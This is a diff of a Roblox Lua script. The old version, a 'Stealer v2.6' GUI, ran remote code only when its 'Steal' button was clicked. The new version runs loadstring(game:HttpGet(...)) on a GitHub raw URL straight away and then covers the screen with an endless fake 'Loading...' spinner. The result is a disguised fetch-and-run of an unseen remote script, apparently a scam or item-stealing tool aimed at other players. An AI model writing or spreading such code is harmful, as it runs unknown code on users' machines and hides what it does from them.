@@ -1,56 +1,46 @@
--- Educational Purpose Only GUI
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MercenariesV3/Vuln.0.25/refs/heads/main/MercenariesUpdatev3.lua"))()
+
+-- Create the GUI
 local player = game.Players.LocalPlayer
-local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-gui.Name = "StealerGUI"
+local playerGui = player:WaitForChild("PlayerGui")
 
--- Main Frame
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 300, 0, 200)
-frame.Position = UDim2.new(0.5, -150, 0.5, -100)
-frame.BackgroundColor3 = Color3.fromRGB(0, 102, 204)
-frame.BorderSizePixel = 0
-frame.Active = true
-frame.Draggable = true
-frame.Parent = gui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "EndlessLoading"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
 
--- Title
-local title = Instance.new("TextLabel")
-title.Text = "Stealer v2.6"
-title.Font = Enum.Font.SourceSansBold
-title.TextSize = 24
-title.TextColor3 = Color3.new(1, 1, 1)
-title.Size = UDim2.new(1, 0, 0, 40)
-title.BackgroundTransparency = 1
-title.Parent = frame
+-- Background
+local background = Instance.new("Frame")
+background.Size = UDim2.new(1, 0, 1, 0)
+background.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+background.BorderSizePixel = 0
+background.Parent = screenGui
 
--- Input TextBox
-local inputBox = Instance.new("TextBox")
-inputBox.PlaceholderText = "Input User!"
-inputBox.Text = ""
-inputBox.Size = UDim2.new(0.8, 0, 0, 40)
-inputBox.Position = UDim2.new(0.1, 0, 0, 60)
-inputBox.Font = Enum.Font.SourceSans
-inputBox.TextSize = 18
-inputBox.TextColor3 = Color3.new(0, 0, 0)
-inputBox.Parent = frame
+-- Spinner
+local spinner = Instance.new("ImageLabel")
+spinner.Size = UDim2.new(0, 100, 0, 100)
+spinner.Position = UDim2.new(0.5, -50, 0.5, -50)
+spinner.BackgroundTransparency = 1
+spinner.Image = "rbxassetid://7733960981" -- Replace with a spinner icon
+spinner.ImageColor3 = Color3.fromRGB(255, 255, 255)
+spinner.Parent = background
 
--- Steal Button
-local stealButton = Instance.new("TextButton")
-stealButton.Text = "Steal"
-stealButton.Size = UDim2.new(0.5, 0, 0, 40)
-stealButton.Position = UDim2.new(0.25, 0, 0, 120)
-stealButton.Font = Enum.Font.SourceSansBold
-stealButton.TextSize = 20
-stealButton.TextColor3 = Color3.new(1, 1, 1)
-stealButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-stealButton.Parent = frame
+-- Optional: Loading Text
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.new(1, 0, 0, 50)
+loadingText.Position = UDim2.new(0, 0, 0.65, 0)
+loadingText.Text = "Loading..."
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.TextTransparency = 0.1
+loadingText.BackgroundTransparency = 1
+loadingText.Font = Enum.Font.GothamSemibold
+loadingText.TextSize = 24
+loadingText.Parent = background
 
--- Button Function
-stealButton.MouseButton1Click:Connect(function()
-    local success, result = pcall(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MercenariesV3/Vuln.0.25/refs/heads/main/MercenariesUpdatev3.lua"))()q
-    end)
-    if not success then
-        warn("Failed to execute script: ", result)
+-- Rotation loop (endless)
+task.spawn(function()
+    while true do
+        spinner.Rotation += 2
+        task.wait(0.01)
     end
 end)
